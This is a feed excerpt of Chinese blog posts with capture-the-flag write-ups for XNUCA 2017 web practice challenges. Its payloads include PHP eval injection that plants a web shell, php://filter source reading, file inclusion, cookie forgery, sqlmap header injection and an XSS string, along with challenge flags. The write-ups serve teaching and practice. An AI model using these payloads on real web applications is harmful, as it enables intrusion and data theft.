<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170818/1.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">6yvt6eYziAHgVRKz3re</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源码泄露、二次注入&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup</title>
    <link href="http://yoursite.com/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/"/>
    <id>http://yoursite.com/2017/08/17/XNUCA-2017-Web专题赛前指导-最安全的笔记管理系统-writeup/</id>
    <published>2017-08-17T08:06:08.000Z</published>
    <updated>2017-08-18T11:42:47.820Z</updated>
    
    <content type="html"><![CDATA[<p>未完待续<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：没错，就是最安全的笔记管理系统，快来管理你的笔记吧~</div><div class="line"></div><div class="line">http://218.76.35.74:20128</div></pre></td></tr></table></figure>
<p>访问后有一个登陆。用弱口令admin：admin可以进入。登陆后出现一个hint：./dbinit.sql</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20128/dbinit.sql</div></pre></td></tr></table></figure></p>
<p>得到如下信息：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`taolu`</span> <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</div><div class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`user`</span>;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`user`</span>(</div><div class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> primary  <span class="keyword">key</span>  auto_increment,</div><div class="line">    <span class="string">`uname`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    <span class="string">`level`</span> tinyint <span class="keyword">not</span> <span class="literal">null</span></div><div class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</div><div class="line"></div><div class="line"><span class="keyword">drop</span>  <span class="keyword">table</span> <span class="keyword">if</span>  <span class="keyword">exists</span> <span class="string">`note`</span>;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`note`</span> (</div><div class="line"></div><div class="line">     <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span> auto_increment,</div><div class="line">     <span class="string">`content`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">     <span class="string">`title`</span>  <span class="built_in">varchar</span>(<span class="number">255</span>)  <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">     <span class="string">`userid`</span>  <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span></div><div class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 ;</div><div class="line"></div><div class="line"><span class="keyword">drop</span> <span class="keyword">table</span>  <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`page`</span> ;</div><div class="line"></div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`page`</span> (</div><div class="line">    <span class="string">`num`</span> <span class="built_in">varchar</span> <span class="keyword">not</span> <span class="literal">null</span></div><div class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`flags`</span>;</div><div class="line"></div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`flags`</span> (</div><div class="line"></div><div class="line">      <span class="string">`id`</span> tinyint <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span> ,</div><div class="line">      <span class="string">`flag`</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span></div><div class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span>  <span class="string">`page`</span> <span class="keyword">values</span> (<span class="number">20</span>);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span>   <span class="string">`note`</span> (title,<span class="keyword">content</span>,userid)<span class="keyword">values</span>(</div><div class="line">     <span class="string">'测试笔记'</span>,<span class="string">'这是管理员发布的测试笔记,个人无法删除(hint:./dbinit.sql)'</span>,<span class="number">1</span></div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>。。不过。。。还没想出来后面咋做。。。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>此题为 2017 铁人三项地区资格赛-套路那么长 原题。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;未完待续&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA 2017-Web专题赛前指导-default-writeup</title>
    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/"/>
    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-default-writeup/</id>
    <published>2017-08-16T11:28:23.000Z</published>
    <updated>2017-08-18T11:41:42.724Z</updated>
    
    <content type="html"><![CDATA[<p>代码执行，闭合构造<br><a id="more"></a></p>
<h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：主页都没有了，就不要扫我了</div><div class="line"></div><div class="line">http://218.76.35.74:20131</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>此时不扫更待何时。。。扫出一个 index2.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">"flag2.php"</span>;</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</div></pre></td></tr></table></figure></p>
<p>传入的参数会经过var_dump()，这里给出两种payload。</p>
<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">?hello=);eval($_POST[&apos;A&apos;]);%2f%2f</div><div class="line"></div><div class="line">或</div><div class="line"></div><div class="line">?hello=);eval(phpinfo());//</div></pre></td></tr></table></figure>
<p>var_dump($a);后的结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string(22) &quot;);eval($_POST[&apos;A&apos;]);//&quot;</div></pre></td></tr></table></figure></p>
<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&quot;string(21) &quot;);eval($_GET[&apos;A&apos;]);//&quot;&quot;);</div></pre></td></tr></table></figure></p>
<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?hello=);eval($_GET[c]&amp;c=phpinfo();</div></pre></td></tr></table></figure>
<p>var_dump()后的结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string(15) &quot;);eval($_GET[c]&quot;</div></pre></td></tr></table></figure></p>
<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&quot;string(17) &quot;);eval($_GET[c]&quot; string(0) &quot;&quot; &quot;);</div></pre></td></tr></table></figure></p>
<p>因此可以通过构造闭合引号。用菜刀连上：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170814/8.png?raw=true" alt=""></p>
<p>真正的flag在flag1.php里。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">F8871804DD8C20C66D2386B3E51ADEC4</div></pre></td></tr></table></figure></p>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>已将此题收录进 <a href="https://github.com/CHYbeta/CTF-Web-Challenge" target="_blank" rel="external">CTF-Web-Challenge</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代码执行，闭合构造&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</title>
    <link href="http://yoursite.com/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/"/>
    <id>http://yoursite.com/2017/08/16/XNUCA-2017-Web专题赛前指导-部分简单题汇总-writeup/</id>
    <published>2017-08-16T11:12:31.000Z</published>
    <updated>2017-08-18T11:42:52.042Z</updated>
    
    <content type="html"><![CDATA[<p>这些都是一些很简单的题。另有一些题会单独拿出来写。<br><a id="more"></a></p>
<h1 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20111</div></pre></td></tr></table></figure>
<p>查看源代码，发现链接：<a href="http://218.76.35.75:20111/Index.php" target="_blank" rel="external">http://218.76.35.75:20111/Index.php</a><br>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">th!5!5n0tth3fl@g</div></pre></td></tr></table></figure></p>
<h1 id="简单问答"><a href="#简单问答" class="headerlink" title="简单问答"></a>简单问答</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20112</div></pre></td></tr></table></figure>
<p>回答三个问题，答案如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Q1) This is HT-CTF____&quot; :</div><div class="line">	2016</div><div class="line">Q2) Acronym for &quot;laughing out loud&quot; :</div><div class="line">	lol</div><div class="line">Q3) Standard port for SSH :</div><div class="line">	22</div></pre></td></tr></table></figure></p>
<p>首先用f12，将<code>&lt;input type=&quot;submit&quot; disabled value=&quot;Submit Quiz&quot;&gt;</code>中的<code>disabled</code>去掉。选择对应的选项，然后用burp截包，截取得到的post包数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">q1=2015&amp;q2=lol+&amp;q4=22&amp;success=false</div></pre></td></tr></table></figure></p>
<p>将2015改为2016，将lol+改为lol，将q4改为q3，将false改为true。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">q1=2016&amp;q2=lol&amp;q3=22&amp;success=true</div></pre></td></tr></table></figure></p>
<p>发包，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">W3ll_d0n3</div></pre></td></tr></table></figure></p>
<h1 id="后台后台后台"><a href="#后台后台后台" class="headerlink" title="后台后台后台"></a>后台后台后台</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20113/</div></pre></td></tr></table></figure>
<p>试着进入Admin Portal，同时用burp截包看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: 218.76.35.75:20113</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://218.76.35.75:20113/</div><div class="line">Cookie: PHPSESSID=lhempf2nd6m7oj4joinm11pmh7; User=JohnTan101; Member=Tm9ybWFs</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 17</div><div class="line"></div><div class="line">adminportal=Enter</div></pre></td></tr></table></figure>
<p>其中Cookie字段中，User为JohnTan101，Member为Tm9ybWFs，用base64解码后为Normal。<br>Forward掉后，页面返回提示：Only Member with Admin rights is allow to enter<br>将Admin进行base64加密后得到QWRtaW4=，作为Member的值，发包，得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C00ki3_n0m_n0m_n0m</div></pre></td></tr></table></figure></p>
<h1 id="php是最好的语言"><a href="#php是最好的语言" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h1><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/</div></pre></td></tr></table></figure>
<p>进去后有三个功能：main显示主页，info显示phpinfo，login是登陆页面。访问时可以发现参数是page=main之类的。猜测有包含，可以利用php伪协议读取源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/</div><div class="line">?page=php://filter/read=convert.base64-encode/resource=login</div></pre></td></tr></table></figure></p>
<p>得到login的源码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$login=@$_POST[<span class="string">'login'</span>];</div><div class="line">$password=@$_POST[<span class="string">'password'</span>];</div><div class="line"><span class="keyword">if</span>(@$login==<span class="string">"admin"</span> &amp;&amp; sha1(@$password)==$pwhash)&#123;</div><div class="line">	<span class="keyword">include</span>(<span class="string">'flag.txt'</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$login&amp;&amp;@$password&amp;&amp;@$_GET[<span class="string">'debug'</span>]) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Login error, login credentials has been saved to ./log/"</span>.htmlentities($login).<span class="string">".log"</span>;</div><div class="line">	$logfile = <span class="string">"./log/"</span>.$login.<span class="string">".log"</span>;</div><div class="line">	file_put_contents($logfile, $login.<span class="string">"\n"</span>.$password);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">	&lt;center&gt;</div><div class="line">		login&lt;br/&gt;&lt;br/&gt;</div><div class="line">		&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</div><div class="line">			&lt;input name=<span class="string">"login"</span> placeholder=<span class="string">"login"</span>&gt;&lt;br/&gt;</div><div class="line">			&lt;input name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span>&gt;&lt;br/&gt;&lt;br/&gt;</div><div class="line">			&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Go!"</span>&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/center&gt;</div></pre></td></tr></table></figure></p>
<p>另外读取到index.php的源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=index</div></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$pwhash=<span class="string">"ffd313052dab00927cb61064a392f30ee454e70f"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'log'</span>]) &#123;</div><div class="line">	<span class="keyword">if</span>(file_exists($_GET[<span class="string">'log'</span>].<span class="string">".log"</span>))&#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">"flag.txt"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'page'</span>] != <span class="string">'index'</span>)&#123;</div><div class="line">	<span class="keyword">include</span>((@$_GET[<span class="string">'page'</span>]?$_GET[<span class="string">'page'</span>].<span class="string">".php"</span>:<span class="string">"main.php"</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>我们先访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/?page=login&amp;debug=1</div><div class="line"></div><div class="line">POST: login=admin&amp;password=1</div></pre></td></tr></table></figure></p>
<p>然后页面会返回：Login error, login credentials has been saved to ./log/admin.log</p>
<p>接着返回index.php，借助index.php里的这个log，就可以得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20115/?log=./log/admin</div></pre></td></tr></table></figure></p>
<p>最后的flag为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">10caL_File_1nc1usi0n_C@n_B3_fun</div></pre></td></tr></table></figure></p>
<h1 id="http-头注入"><a href="#http-头注入" class="headerlink" title="http 头注入"></a>http 头注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20121/</div></pre></td></tr></table></figure>
<p>test.tx<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /heetian.php HTTP/1.1</div><div class="line">Host: 218.76.35.75:20121</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://218.76.35.75:20121/</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p>
<p>用sqlmap跑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -r test.txt --level 3 -D ctfweb20110 -T flag --dump</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Y0ugetT82f00000laev</div></pre></td></tr></table></figure></p>
<h1 id="简单的文件上传"><a href="#简单的文件上传" class="headerlink" title="简单的文件上传"></a>简单的文件上传</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">描述：上传php 文件就给你flag</div><div class="line">http://218.76.35.75:20122</div></pre></td></tr></table></figure>
<p>截断上传。<br>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Upl00d30668ss9h97aFil3</div></pre></td></tr></table></figure></p>
<h1 id="简单的JS"><a href="#简单的JS" class="headerlink" title="简单的JS"></a>简单的JS</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20123/</div></pre></td></tr></table></figure>
<p>查看源代码，将<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p=<span class="string">"60,105,102,114,97,109,101,32,104,101,105,103,1...12,34,62"</span></div><div class="line">p=<span class="built_in">eval</span>(<span class="string">"String.fromCharCode("</span>+p+<span class="string">")"</span>);</div></pre></td></tr></table></figure></p>
<p>放到控制台里运行一下，得到如下结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe height=0 width=0 src=&quot;./fl0a.php&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20123/fl0a.php</div></pre></td></tr></table></figure></p>
<p>用burp查看返回包，在Cookie字段发现flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C00k1els60SecU5e</div></pre></td></tr></table></figure></p>
<h1 id="php-是门松散的语言"><a href="#php-是门松散的语言" class="headerlink" title="php 是门松散的语言"></a>php 是门松散的语言</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20124/</div></pre></td></tr></table></figure>
<p>得到源代码，可知是变量覆盖问题，parse_str() 函数把查询字符串解析到变量中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$he =&apos;goodluck&apos;;</div><div class="line"></div><div class="line">parse_str($_GET[&apos;heetian&apos;]);</div><div class="line"></div><div class="line">if $he = &apos;abcd&apos;;</div><div class="line"></div><div class="line">echo $flag;</div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20124/</div><div class="line">?heetian=he=abcd</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C00d1uckf0rY0uuu</div></pre></td></tr></table></figure></p>
<h1 id="试试xss"><a href="#试试xss" class="headerlink" title="试试xss"></a>试试xss</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：alert document.domain</div><div class="line"></div><div class="line">http://218.76.35.75:20125</div></pre></td></tr></table></figure>
<p>fuzz一下，闭合前面的单引号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&apos; onerror=alert(document.domain)</div></pre></td></tr></table></figure></p>
<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">D0Gum6Ntd0M11n</div></pre></td></tr></table></figure></p>
<h1 id="简单的文件包含"><a href="#简单的文件包含" class="headerlink" title="简单的文件包含"></a>简单的文件包含</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：Flag 在/flag</div><div class="line"></div><div class="line">http://218.76.35.75:20126</div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20126/index.php?page=/flag</div></pre></td></tr></table></figure></p>
<p>查看源代码，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag: 62a72cb2f3d5e7fc0284da9f21e66c9f.php</div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20126/62a72cb2f3d5e7fc0284da9f21e66c9f.php</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">F11elNcLud3Get</div></pre></td></tr></table></figure></p>
<h1 id="简单的验证"><a href="#简单的验证" class="headerlink" title="简单的验证"></a>简单的验证</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：你不是amdin，没有权限查看flag</div><div class="line"></div><div class="line">http://218.76.35.75:20127</div></pre></td></tr></table></figure>
<p>截包，看Cookie字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie: user=Bob; guess=999</div></pre></td></tr></table></figure></p>
<p>题目的提示错了，应该是admin。<br>把Bob改为admin，然后guess用burp来爆破，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EaSy70Ch1ngG00kie</div></pre></td></tr></table></figure></p>
